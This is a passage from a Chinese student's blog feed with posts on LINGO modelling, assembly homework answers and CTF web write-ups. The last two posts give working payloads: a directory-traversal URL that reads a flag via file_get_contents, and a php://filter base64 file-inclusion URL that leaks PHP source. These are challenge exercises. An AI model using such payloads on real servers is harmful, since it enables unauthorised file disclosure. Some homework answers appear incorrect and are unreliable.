punctuation">.</span>SelectedPath<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> path<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> c# </tag>
            
            <tag> c#初学者总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lingo编程初探</title>
      <link href="2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2/"/>
      <url>2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>情深难寿</p></blockquote><p><strong>*&gt;这里学了点lingo，主要是数学建模要用，总不能啥都叫队友做吧，那也太划水了（虽然我喜欢划水，下面是lingo的一些简单的方法，和我不到一个小时在B站学到的小技巧（其实就是能让你理解的那种东西</strong></p><h2 id="1-基本教程"><a href="#1-基本教程" class="headerlink" title="1.基本教程"></a>1.基本教程</h2><h3 id="1-运算符"><a href="#1-运算符" class="headerlink" title="1.运算符"></a>1.运算符</h3><h3 id="2-lingo段"><a href="#2-lingo段" class="headerlink" title="2.lingo段"></a>2.lingo段</h3><p>~电脑有点坏了，粘不了了，有需要自己查⑧~</p><h2 id="2-我自己的学习"><a href="#2-我自己的学习" class="headerlink" title="2.我自己的学习"></a>2.我自己的学习</h2><blockquote><p>我自己学的东西，其实就是举几个例子，尽量解释一下各个语句的含义吧</p></blockquote><h3 id="例一、十个城市之间连接送货的线性规划"><a href="#例一、十个城市之间连接送货的线性规划" class="headerlink" title="例一、十个城市之间连接送货的线性规划"></a>例一、十个城市之间连接送货的线性规划</h3><pre class="line-numbers language-none"><code class="language-none">model:sets:city&#x2F;1..10&#x2F;:u;                                         !两个&quot;..&quot;,别手抖多打了hh;link(city,city):d,x;endsets                                                       !对应城市之间的权重;data:d&#x3D;0  7  4  5  8  6  12  13  11  187  0  3  10 9  14 5   14  17  174  3  0  5  9  10 21  8   27  125  10 5  0  14 9  10  9   23  168  9  9  14 0  7  8   7   20  19 6  14 10 9  7  0  13  5   25  1312 5  21 10 8  13 0   23  21  1813 14 8  9  7  5  23  0   18  1211 17 27 23 20 25 21  18  0   1618 17 12 16 19 13 18  12  16  0;enddatamin&#x3D;@sum(link:d*x);                                    @for( city(j) : @sum(city(i)|j #ne# i : x(i,j)) &#x3D; 1);  !城市j后只有一个城市相连;@for( city(i) : @sum(city(j)|i #ne# j : x(i,j)) &#x3D; 1);  !城市i前只有一个城市相连;@for( link(i,j)|i #ne# j #and# i #gt# 1 : u(i)-u(j)+10*x(i,j)&lt;&#x3D;9);@for( link:@bin(x) );end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意:lingo中<code>|</code>表示过滤条件，拿下面的这个用例来讲，解释一下<code>|</code>的意义吧<br><pre class="line-numbers language-none"><code class="language-none">@for( city(j) : @sum(city(i)|j #ne# i : x(i,j)) &#x3D; 1);  !城市j后只有一个城市相连;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这个语句中<code>city(i)|j #ne# i</code>为<code>x(i,j)) = 1</code>数学函数的约束条件，现在就解释这个语句吧<br><pre class="line-numbers language-none"><code class="language-none">city(i) | j #ne# i <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>表示city里面j≠i的组合，也是个约束条件吧。感觉数学建模语言里面最难的就是约束条件了吧，真cao。</p></blockquote><p><strong>划重点1</strong></p><p><code>@for( city(j) : @sum(city(i)|j #ne# i : x(i,j)) = 1);  !城市j后只有一个城市相连;</code><br>这里的比较通俗的解释为<code>对于j属于1~10，求在i≠j的条件下，i从1递增到十累加x(i,j)的和为1</code>，这里的数学含义不好解释，让队友搞[/笑]</p><p><strong>划重点2</strong><br><code>@for( link(i,j) | i #ne# j #and# i #gt# 1 : u(i)-u(j)+10*x(i,j)&lt;=9);</code><br>这里表示link(i,j)这个集合下满足<code>1&lt;i≠j</code>的所有i和j的值亦需要满足条件<code>u(i)-u(j)+10*x(i,j)&lt;=9</code></p><p><strong>最重要的注意:对于u(i),u代表左边的那个，i代表下标；显然x(i,j)括号里面的i与j表示ij这样的下标，下面是u(i)和x(i,j)的数学表达</strong><br><img src="/2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2/1.png" alt><br><img src="/2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2/2.png" alt><br>差不多明白了，数学建模语言不过如此，我闪电五连鞭直接入门。</p><h2 id="3-有用的链接"><a href="#3-有用的链接" class="headerlink" title="3.有用的链接"></a>3.有用的链接</h2><p><a href="https://www.bilibili.com/video/BV1bt411m7qD?from=search&amp;seid=686665940954612874">B站视频链接(总结的超级好，20分钟胜过自己学一个小时了)</a><br><a href="https://zhuanlan.zhihu.com/p/62259076">B乎文章，总结的似乎也不错</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
            <tag> lingo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编作业</title>
      <link href="2020/11/18/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A/"/>
      <url>2020/11/18/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>我可以轻易放过别人，却怎么也不肯放过自己。</p></blockquote><p><strong>没时间了，快上车</strong></p><blockquote><p>这里记录一下我的汇编作业，接下来的不到两个月一定好好学。</p></blockquote><h3 id="习题一"><a href="#习题一" class="headerlink" title="习题一"></a>习题一</h3><h5 id="1-解释和区别下列名词术语"><a href="#1-解释和区别下列名词术语" class="headerlink" title="1.解释和区别下列名词术语"></a>1.解释和区别下列名词术语</h5><p><strong>1)微处理器和微型计算机系统。</strong></p><blockquote><p>微处理器只是一个中央处理器（CPU），由算术逻辑部件(ALU)，累加器和通用寄存器组，程序计数器，时序和控制逻辑部件，内部总线等组成。微处理器不能构成独立工作的系统，也不能独立执行程序。</p><p>微型计算机由CPU，存储器，输入/输出接口电路和系统总线组成，具有计算功能，能独立执行程序，但不能显示或输出，仍不能正常工作。以微型计算机为主体，配上外部输入/输出设备及系统软件就构成了微型计算机系统，这样就可以正常工作了。</p></blockquote><p>区别:微处理器不能独立工作，微型计算机可以；微型计算机包含微处理器。</p><p><strong>2)硬件和软件。</strong></p><blockquote><p>硬件:计算机硬件”的简称(中国大陆及香港用语，台湾作硬体)。与“软件”相对。电子计算机系统中所有实体部件和设备的统称。从基本结构上来讲，电脑可以分为五大部分：运算器、存储器、控制器、输入设备、输出设备等。</p><p>软件:计算机软件，是指计算机程序以及解释和指导使用程序的文档的总和。<code>(后面可不抄)</code>计算机程序包括源程序和目标程序。源程序是指用高级语言或汇编语言编写的程序，目标程序是指源程序经编译或解释加工以后，语言编写的程序，目标程序是指源程序经编译或解释加工以后可以由计算机直接执行的程序。</p></blockquote><p>区别:硬件摸得到，软件摸不到。</p><p><strong>3)系统软件和应用软件。</strong></p><blockquote><p>为了方便地使用机器及其输入输出设备，充分发挥计算机系统的效率，围绕计算机系统本身开发的程序系统叫做系统软件。</p><p>应用软件是专门为了某种使用目的而编写的程序系统。</p></blockquote><p>区别:应用软件是基于系统软件而建立的，系统软件是应用软件的底层支持。</p><p><strong>4)机器语言、汇编语言和高级语言。</strong></p><blockquote><p>机器语言是计算机能直接运行的语言，是二进制语言，属于低级语言；汇编语言是面向机器的低级语言，不能被机器直接识别，需要编译；高级语言是从人类的逻辑思维角度出发的计算机语言，不能被机器直接识别，需要编译。</p></blockquote><p>区别:计算机语言具有高级语言和低级语言之分。而高级语言又主要是相对于汇编语言而言的，它是较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序。</p><p><strong>5)汇编语言程序和汇编程序。</strong></p><blockquote><p>用汇编语言编写的叫做汇编语言程序，而汇编程序是指把汇编语言书写的程序翻译成与之等价的机器语言程序的翻译程序。</p></blockquote><p>区别:汇编语言程序依赖于汇编程序编译才可运行。</p><p><strong>6)总线、内部总线和系统总线。</strong></p><blockquote><p>总线是一组信号线的集合，它定义了各引线的信号、电机、机械特性，使计算机内部各组成部分之间以及不同的计算机之间建立信号联系，进行信息传送和通信</p><p>内部总线：在CPU内部，寄存器之间和算术逻辑部件ALU与控制部件之间传输数据所用的总线称为片内总线(即芯片内部的总线)。</p><p>系统总线：又称内总线或板级总线，是微机中各插件板与系统板之间的总线，用于插件板一级的互联。因为该总线是用来连接微机各功能部件而构成一个完整微机系统的，所以称之为系统总线。</p></blockquote><p>区别:内部总线在cpu内，系统总线在cpu外各插件板与系统板之间，他们都属于总线。</p><h3 id="习题二"><a href="#习题二" class="headerlink" title="习题二"></a>习题二</h3><h5 id="6-试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。"><a href="#6-试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。" class="headerlink" title="6.试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。"></a>6.试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。</h5><pre class="line-numbers language-none"><code class="language-none">1278H+3469H54E3H-27A0H3881H+3597H01E3H-01E3H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>1</strong><br><pre class="line-numbers language-none"><code class="language-none">1278H+3469H答: 0001 0010 0111 1000+0011 0100 0110 1001—————————————————————— 0100 0110 1110 0001ZF&#x3D;0;SF&#x3D;0;CF&#x3D;0;OF&#x3D;0;AF&#x3D;1;PF&#x3D;1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><strong>2</strong><br><pre class="line-numbers language-none"><code class="language-none"> 0101 0100 1110 0011+0010 0111 1010 0000—————————————————————— 0111 1100 1000 0011ZF&#x3D;0;SF&#x3D;0;CF&#x3D;0;OF&#x3D;0;AF&#x3D;1;PF&#x3D;1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><strong>3</strong><br><pre class="line-numbers language-none"><code class="language-none"> 0011 1000 1000 0001+0011 0101 1001 0111—————————————————————— 0110 1110 0001 1000ZF&#x3D;0;SF&#x3D;0;CF&#x3D;0;OF&#x3D;0;AF&#x3D;1;PF&#x3D;0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><strong>4</strong><br><pre class="line-numbers language-none"><code class="language-none"> 0001 1110 0011+0001 1110 0011—————————————————————— 0011 1100 0110ZF&#x3D;0;SF&#x3D;0;CF&#x3D;0;OF&#x3D;0;AF&#x3D;1;PF&#x3D;0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><blockquote><p>进位标志和溢出标志的区别:进位表示最高位产生进位。溢出表示超出数的表示范围。</p></blockquote><p>进位判断方法：加减时最高位产生进位或借位，代表结果超出无符号数的范围，单字节就是0<code>~</code>255；<br>溢出判断方法：加减时最高位和次高位中有且仅有一个产生进位或借位，代表结果超出有符号数的范围，单字节就是-128<code>~</code>127</p><h5 id="8-什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？"><a href="#8-什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？" class="headerlink" title="8.什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？"></a>8.什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？</h5><blockquote><p>逻辑地址(LogicalAddress)是指由程序产生的与段相关的偏移地址部分。有时我们也把逻辑地址称为虚拟地址</p><p>物理地址（Physical Address） 是指出现在CPU外部地址总线上的寻址物理内存的地址信号，是地址变换的最终结果地址。如果启用了分页机制，那么线性地址会使用页目录和页表中的项变换成物理地址。如果没有启用分页机制，那么线性地址就直接成为物理地址了。</p><p>二者关系：逻辑地址和物理地址相对的。物理地址是唯一的，逻辑地址的相对的。</p></blockquote><h3 id="习题三"><a href="#习题三" class="headerlink" title="习题三"></a>习题三</h3><h5 id="1-已知DS-2000H，BX-0100H，SI-0002H，存储单元-20100H-20103H-依次存放12-34-56-78H，-21200H-21203H-依次存放2A-4C-B7-65H，说明下列每条指令执行后AX寄存器的内容。"><a href="#1-已知DS-2000H，BX-0100H，SI-0002H，存储单元-20100H-20103H-依次存放12-34-56-78H，-21200H-21203H-依次存放2A-4C-B7-65H，说明下列每条指令执行后AX寄存器的内容。" class="headerlink" title="1.已知DS=2000H，BX=0100H，SI=0002H，存储单元[20100H]~[20103H]依次存放12 34 56 78H，[21200H]~[21203H]依次存放2A 4C B7 65H，说明下列每条指令执行后AX寄存器的内容。"></a>1.已知DS=2000H，BX=0100H，SI=0002H，存储单元[20100H]<code>~</code>[20103H]依次存放12 34 56 78H，[21200H]<code>~</code>[21203H]依次存放2A 4C B7 65H，说明下列每条指令执行后AX寄存器的内容。</h5><pre class="line-numbers language-none"><code class="language-none">1)MOV AX,1200H2)MOV AX,BX3)MOV AX,[1200H]4)MOV AX,[BX]5)MOV AX,[BX+1100H]6)MOV AX,[BX+SI]7)MOV AX,[BX][SI+1100H]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-标准答案" data-language="标准答案"><code class="language-标准答案">(1）AX&#x3D;1200H(2) AX&#x3D;0100H(3）AX&#x3D;4C2AH ;偏移地址&#x3D;bx&#x3D;0100h(4）AX&#x3D;3412H ;偏移地址&#x3D;bx&#x3D;0100h(5）AX&#x3D;4C2AH ;偏移地址&#x3D;bx+1100h&#x3D;1200h(6）AX&#x3D;7856H ;偏移地址&#x3D;bx+si&#x3D;0100h+0002h&#x3D;0102h(7）AX&#x3D;65B7H ;偏移地址&#x3D;bx+si+1100h&#x3D;0100h+0002h+1100h&#x3D;1202h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="6-给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。"><a href="#6-给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。" class="headerlink" title="6.给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。"></a>6.给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。</h5><pre class="line-numbers language-none"><code class="language-none">MOV AL,89HADD AL,ALADD AL,9DHCMP AL,0BCHSUB AL,ALDEC ALINC AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-标准答案" data-language="标准答案"><code class="language-标准答案">〔解答)              CF ZF SF OF PFmov al,89h  ;AL&#x3D;89h add al,al   ;AL&#x3D;12h  1  0  0  1  1;1000 1001+1000 1001————————————10001 0010add al,9dh  ;AL&#x3D;Oafh 0  0  1  0  1;0001 0010+1001 1101———————————— 1010 1111cmp al,0bch ;AL&#x3D;0afh 1  0  1  0  1;1010 1111-1011 1100———————————— 0100 0011sub al,al   ;AL&#x3D;00h  0  1  0  0  1dec al      ;AL&#x3D;Offh 0  0  1  0  1;0000 0000-0000 0001———————————— 1111 1111inc al      ;AL&#x3D;00h  0  1  0  0  1;1111 1111+0000 0001———————————— 1111 1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="15-什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？"><a href="#15-什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？" class="headerlink" title="15.什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？"></a>15.什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？</h5><p><strong><a href="https://blog.csdn.net/SmartLoveyu/article/details/90209810">引用自此</a></strong></p><blockquote><p>短转移、近转移、远转移<br>首先，短转移是最短的，近转移和远转移是相对的近和远。</p><h6 id="关于位移量"><a href="#关于位移量" class="headerlink" title="关于位移量"></a><strong>关于位移量</strong></h6><p>短转移（JMP SHORT LABEL）的位移量：IP ← IP + 8位的位移量<br>近转移（JMP NEAR PTR LABEL）的位移量：IP ← IP + 16位的位移量<br>远转移（JMP FAR PTR LABEL）的位移量：IP ← LABEL的偏移地址，CS ← LABEL的段基址</p></blockquote><h6 id="关于三种转移的IP值"><a href="#关于三种转移的IP值" class="headerlink" title="关于三种转移的IP值"></a><strong>关于三种转移的IP值</strong></h6><p>短转移：JMP位置的IP值加2，即IP指向了下一条指令，再加上IP+1位置的一个8bit位移量。<br>近转移：因为位移量是16bit，需要占两个字节，所以JMP位置的IP值加3，再加上IP+1和IP+2组成的位移量。<br>远转移：采用段加偏移，CS的值在高地址、IP值在低地址</p><h6 id="gt-关于此题目"><a href="#gt-关于此题目" class="headerlink" title="&gt;关于此题目"></a>&gt;<strong>关于此题目</strong></h6><p><strong>一解</strong></p><blockquote><p>短转移(SHORT)，近转移(NEAR)和远转移(FAR)。短转移是指要跳至的目标地址与当前地址前后相差不超过128字节。近转移是指跳转的目标地址与当前地址在用一个段内，即CS的值不变，只改变EIP的值。远转移指跳到另一个代码段去执行，CS/EIP都要改变。<br><strong>二解</strong><br>短转移:  指段内―128<code>~</code>127之间的转移，位移量用一个字节表示近转移:指段内+32K之间的转移，位移量用一个字表示<br>远转移:  指段间1MB范围的转移<br>段内转移:指在同一个代码段内的转移，可以是短转移或者近转移<br>段间转移:指转移到另外一个代码段，就是远转移</p></blockquote><h5 id="16-假设DS-2000H，BX-1256H，SI-528FH，位移量TABLE-20A1H，-232F7H-3280H，264E5H-2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？"><a href="#16-假设DS-2000H，BX-1256H，SI-528FH，位移量TABLE-20A1H，-232F7H-3280H，264E5H-2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？" class="headerlink" title="16.假设DS=2000H，BX=1256H，SI=528FH，位移量TABLE=20A1H，[232F7H]=3280H，264E5H=2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？"></a>16.假设DS=2000H，BX=1256H，SI=528FH，位移量TABLE=20A1H，[232F7H]=3280H，264E5H=2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？</h5><pre class="line-numbers language-none"><code class="language-none">JMP BXJMP TABLE[BX]JMP [BX][SI]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-标准答案" data-language="标准答案"><code class="language-标准答案">&lt;解答&gt;(1）转移的有效地址EA&#x3D;BX&#x3D;1256H(2）转移的有效地址EA&#x3D;[DS:20A1H+1256H]&#x3D;[232F7]&#x3D;3280H(3）转移的有效地址EA&#x3D;[DS :1256H+528FH]&#x3D;264E5H&#x3D;2450H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言与接口技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unctf之web</title>
      <link href="2020/11/17/unctf%E4%B9%8Bweb/"/>
      <url>2020/11/17/unctf%E4%B9%8Bweb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>练习场做点题</strong></p><h1 id="1-easy-ssrf"><a href="#1-easy-ssrf" class="headerlink" title="1.easy_ssrf"></a>1.easy_ssrf</h1><p><strong>Tag:ssrf，preg_match绕过</strong><br>下面给出源代码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span><span class="token single-quoted-string string">'&lt;center>&lt;strong>welc0me to 2020UNCTF!!&lt;/strong>&lt;/center>'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/unctf\.com/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/php|file|zip|bzip|zlib|base|data/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$url</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'error!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>传<code>?url=unctf.com/../../../../../flag</code>直接获取flag，这算是目录穿越⑧</p><blockquote><p>file_get_contents使用不存在的协议名（对此来说，unctf.com应当就相当于不能识别的伪协议名）导致目录穿越，实现SSRF<br>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p></blockquote><h1 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2018</title>
      <link href="2020/11/17/N1CTF2018/"/>
      <url>2020/11/17/N1CTF2018/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>今天准备做个一般的来着呢，结果没做出来，菜死了。做个简单的水一篇文章。</p></blockquote><h1 id="1-eating-cms"><a href="#1-eating-cms" class="headerlink" title="1.eating_cms"></a>1.eating_cms</h1><p>找到注册界面<code>register.php</code>，php伪协议<code>http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=user#</code><br><code>user.php</code><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后看<code>function.php</code><br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;function#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre 